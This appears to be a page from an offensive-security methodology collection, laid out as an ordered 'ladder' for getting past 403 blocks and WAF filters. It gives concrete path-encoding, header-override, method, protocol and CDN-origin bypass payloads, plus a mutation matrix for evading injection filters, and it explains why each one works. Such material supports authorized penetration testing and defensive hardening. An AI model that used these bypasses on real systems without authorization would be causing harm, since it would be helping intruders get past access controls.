# The Bypass Doctrine — Master Ladder

A control is a claim. Every claim is testable. This ladder is the order in which you
test them, cheapest and most-likely first. You do not say "blocked" until the ladder is
walked and `mutations.md` has a line per rung.

---

## Rung 0 — Re-establish the baseline

Before bypassing anything, confirm the block is real and stable.

```bash
curl -i -sS --path-as-is 'https://t/admin' -H 'X-Hunt-Tag: r7-000'
```

- 403 from the **edge** (`cf-ray`, `Server: cloudflare`, generic HTML) = WAF/ACL.
- 403 from the **app** (framework body, JSON error) = authorization logic.
- 200 with a login form = redirect to auth, not a block.
- 302 to `/login?next=/admin` = auth gate.

Different blocks need different ladders. Rungs 1–8 are for edge blocks; rungs 9–14 are
for app blocks.

---

## The ladder

| # | Rung | Examples |
|---|---|---|
| 1 | Case | `/Admin`, `/ADMIN`, `/aDmIn` |
| 2 | Trailing/leading junk | `/admin/`, `/admin/.`, `/admin//`, `//admin`, `/./admin` |
| 3 | Encoded dots/slashes | `/%2e/admin`, `/admin%2f`, `/admin/%2e%2e/admin` |
| 4 | Semicolon / matrix params | `/admin;/`, `/admin;.css`, `/admin/..;/` |
| 5 | Extension | `/admin.json`, `/admin.html`, `/admin.css`, `/admin/` |
| 6 | Null / fragment / query | `/admin%00`, `/admin%23`, `/admin?a=1` |
| 7 | Overlong UTF-8 | `/admin%c0%af`, `%c0%ae%c0%ae/` |
| 8 | Double encoding | `/%252e/admin`, `/admin%252f` |
| 9 | Header override | `X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-Prefix` |
| 10 | Host override | `X-Forwarded-Host: localhost`, `X-Forwarded-For: 127.0.0.1` |
| 11 | Method swap | `POST`, `HEAD`, `OPTIONS`, `PUT`, `TRACE`, `PATCH` |
| 12 | Transport swap | params from query → body → multipart → JSON |
| 13 | Protocol | HTTP/1.0, `Connection: close`, h2c upgrade |
| 14 | Infrastructure | origin IP + `Host:`, alt port, IPv6, direct-to-app bypass of CDN |

Rungs 1–8 are one script: `07-tooling/python/bypass_403.py`.

---

## Why each rung works (the mechanism, not the payload)

- **Case** — the ACL is a case-sensitive string compare; the router is case-insensitive.
- **Trailing junk** — the ACL matches exact paths; the router normalizes.
- **Encoded dots** — the ACL decodes once; the router decodes and normalizes.
- **Semicolon** — Java/Tomcat strips `;jsessionid`-style matrix params; the ACL does not.
- **Extension** — static-file rules bypass auth filters (`/admin.css` served by nginx).
- **Null** — C string truncation at the ACL; the router keeps the suffix.
- **Overlong UTF-8** — old decoders accept 3-byte encodings of ASCII.
- **Double encoding** — one decode at the edge, a second at the app.
- **Header override** — the front proxy routes on the header, the app authorizes on the path.
- **Host override** — internal vhosts trust `localhost` and skip auth.
- **Method swap** — the ACL covers `GET` only; `POST` reaches the controller.
- **Transport swap** — the WAF inspects query strings, not multipart bodies.
- **Protocol** — HTTP/1.0 has no `Host` requirement, so vhost routing changes.
- **Infrastructure** — the CDN is the only thing enforcing the rule.

---

## The mutation matrix (per blocked parameter, not per path)

When the block is on a **value** rather than a path, the ladder changes:

```
case → whitespace (%20 %09 %0a + /**/) → comment (-- , #, /* */) →
quote swap (' " ` ´ ʼ) → concat (CONCAT(), ||, +) →
encoding (url, double, unicode, html, hex, octal) → charset (fullwidth, homoglyph) →
null byte → truncation → alternate syntax (same meaning, different token)
```

`07-tooling/python/payload_mutator.py --matrix all` generates this set.

---

## The three-strike rule

Three payloads of the same shape failing means the *shape* is wrong, not the payload.
Change rung class entirely. Three rungs failing means re-establish the baseline — you may
be testing the wrong block.

---

## Recording

Every rung gets a line in `mutations.md`:

```
rung 4 (semicolon) on /admin: 403, 460 B, same body → rung dead
rung 9 (X-Original-URL) on /admin: 200, 8.2 KB, admin panel → BYPASS
```

The rung that works is the finding. The rungs that failed are the report's "tested" list.

---

## Go deeper

1. Chain rungs: `X-Original-URL` + `..;/` + `%00`.
2. Apply the working rung to every sibling path — one bypass usually generalizes.
3. Check whether the bypass also defeats **rate limits** and **CSRF** (same edge).
4. Re-test the bypass after 10 minutes; some rules are cached and some are not.

---

## Related

- `02-web/401-to-200.md`
- `11-regex/20-bypass.md`
- `00-core/impact-proof.md`
